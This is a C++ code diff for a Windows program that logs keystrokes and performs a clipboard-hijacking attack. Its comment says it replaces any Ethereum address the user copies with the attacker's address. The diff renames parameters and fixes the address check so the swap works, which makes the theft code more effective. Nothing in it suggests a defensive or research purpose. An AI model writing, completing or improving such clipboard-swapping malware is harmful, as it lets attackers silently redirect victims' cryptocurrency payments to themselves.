@@ -75,8 +75,8 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile.close();
 }
 
-bool isEthAddress(std::wstring cbText){
-	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42) {
+bool isEthAddress(std::wstring cbText, std::wstring attackerAddress){
+	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42 && wcscmp(cbText, attackerAddress) != 0) {
 		return TRUE;
 	}
 	return FALSE;
@@ -85,19 +85,19 @@ bool isEthAddress(std::wstring cbText){
 /* clipboardAttack is a famous attack in the crypto space, it will scan your clipboard for amy cryptocurrency address, when copied it will be immediately replaced with the attacker's address.
 This function check if the new clipboard data is an ethereum address then allocates a global memory object for the attacker's address to be copied to clipboard instead */
 
-void clipboardAttack(LPWSTR ethAddress){
+void clipboardAttack(LPWSTR attackerAddress){
 	std::wstring	cbText;
 	HGLOBAL 		dstHandle;
 	LPWSTR			dstEthAddress;
 	DWORD			len;
 
-	len = wcslen(ethAddress); // Should be 42
+	len = wcslen(attackerAddress); // Should be 42
 	cbText = getClipboardText();
-	if (isEthAddress(ethAddress)){
+	if (isEthAddress(cbText, attackerAddress)){
 		std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
 		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
 		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
-		memcpy(dstEthAddress, ethAddress, len * sizeof(WCHAR));
+		memcpy(dstEthAddress, attackerAddress, len * sizeof(WCHAR));
 		dstEthAddress[len] = NULL;
 		GlobalUnlock(dstHandle);
 
